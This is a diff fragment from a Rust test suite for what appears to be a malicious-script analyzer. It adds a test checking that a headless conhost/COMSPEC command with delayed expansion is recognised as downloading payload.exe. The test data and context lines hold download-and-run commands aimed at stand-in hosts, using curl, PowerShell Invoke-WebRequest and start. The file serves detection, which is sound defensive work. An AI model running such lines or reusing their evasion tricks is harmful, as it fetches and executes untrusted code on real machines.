@@ -4570,6 +4570,23 @@ start "" "C:\Users\Public\payload.exe""#,
     }
 
     #[test]
+    fn conhost_comspec_cmd_child_preserves_delayed_expansion() {
+        let script = br#"conhost.exe --headless %COMSPEC% /V:ON /c set U=https://conhost-comspec.example/payload.exe&&curl -o payload.exe !U!"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://conhost-comspec.example/payload.exe"
+                        && dst.as_deref() == Some("payload.exe")
+            )),
+            "conhost COMSPEC child command was not analyzed: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn start_local_target_resolves_prior_conhost_powershell_download_source_url() {
         let report = analyze(
             br#"conhost.exe --headless powershell.exe -NoP -Command "Invoke-WebRequest -Uri https://conhost-ps-start.example/payload.exe -OutFile C:\Users\Public\payload.exe"
